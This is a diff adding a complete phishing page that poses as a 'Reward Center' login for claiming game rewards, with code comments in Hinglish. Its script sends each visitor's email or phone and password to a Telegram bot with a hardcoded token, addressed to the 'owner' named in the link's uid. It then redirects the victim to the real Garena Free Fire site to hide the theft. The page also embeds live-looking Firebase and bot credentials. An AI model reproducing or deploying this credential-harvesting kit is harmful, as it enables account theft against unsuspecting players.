@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login | Reward Center</title>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <style>
+        body { font-family: sans-serif; background: #111; color: white; text-align: center; padding-top: 50px; }
+        .login-box { background: #222; padding: 20px; border-radius: 10px; display: inline-block; width: 300px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
+        button { width: 95%; padding: 10px; background: #e74c3c; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <h2>Login to Claim</h2>
+    <input type="text" id="email" placeholder="Email or Phone" required>
+    <input type="password" id="pass" placeholder="Password" required>
+    <button onclick="sendData()">Login</button>
+</div>
+
+<script>
+    // 1. Firebase Configuration (Wahi jo aapke Dashboard me hai)
+    const firebaseConfig = {
+        apiKey: "AIzaSyBY4tPdcDfl0C-FRiP3L52PA2WctlziUtM",
+        authDomain: "flowwebsff.firebaseapp.com",
+        projectId: "flowwebsff",
+        storageBucket: "flowwebsff.firebasestorage.app",
+        messagingSenderId: "693709721624",
+        appId: "1:693709721624:web:e15f6cba7e97288631736d"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // 2. URL se UID aur ChatID nikalne ka logic
+    const params = new URLSearchParams(window.location.search);
+    const ownerUid = params.get("uid"); 
+    let ownerChatId = "";
+
+    // Firebase se Owner ki Telegram ID pehle hi nikal lo
+    if(ownerUid) {
+        db.collection("users").doc(ownerUid).get().then(doc => {
+            if(doc.exists) {
+                ownerChatId = doc.data().telegramChatID;
+            }
+        });
+    }
+
+    // 3. Telegram par data bhejne ka function
+    function sendData() {
+        const email = document.getElementById("email").value;
+        const pass = document.getElementById("pass").value;
+        const botToken = "8232315153:AAHHEvvBKyUkxTPXmGyubWVPuW8ZSv5Qq8E"; // Apna Bot Father se mila token yahan dalein
+
+        if(!ownerChatId) {
+            alert("Error: Owner has not linked Telegram!");
+            return;
+        }
+
+        const message = `
+🔥 **NEW LOGIN RECEIVED** 🔥
+━━━━━━━━━━━━━━━━━━
+👤 **Owner UID:** ${ownerUid}
+📧 **Email:** ${email}
+🔑 **Password:** ${pass}
+━━━━━━━━━━━━━━━━━━
+        `;
+
+        // Telegram API ko hit karna
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        fetch(telegramUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: ownerChatId,
+                text: message,
+                parse_mode: "Markdown"
+            })
+        })
+        .then(res => {
+            // Data bhejne ke baad visitor ko asli game page par redirect kar do
+            window.location.href = "https://ff.garena.com/"; 
+        })
+        .catch(err => console.error(err));
+    }
+</script>
+
+</body>
+</html>
